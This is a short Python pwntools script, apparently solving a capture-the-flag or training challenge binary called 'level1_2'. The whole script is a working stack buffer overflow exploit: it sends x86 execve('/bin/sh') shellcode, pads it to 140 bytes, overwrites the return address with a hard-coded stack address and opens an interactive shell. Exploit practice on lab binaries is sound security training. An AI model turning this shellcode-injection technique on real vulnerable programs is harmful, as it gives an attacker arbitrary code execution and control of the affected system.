#coding=utf-8
from pwn import *

context.binary = './level1_2'
p = process('./level1_2')
stack = 0xffffd440
ret = 0xffffd4cc

shellcode = asm(shellcraft.sh())
shellcode = '\x31\xC9\xF7\xE1\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xB0\x0B\xCD\x80'
payload = shellcode + 'a' * (140 - len(shellcode)) + p32(stack)
p.send(payload)
p.interactive()
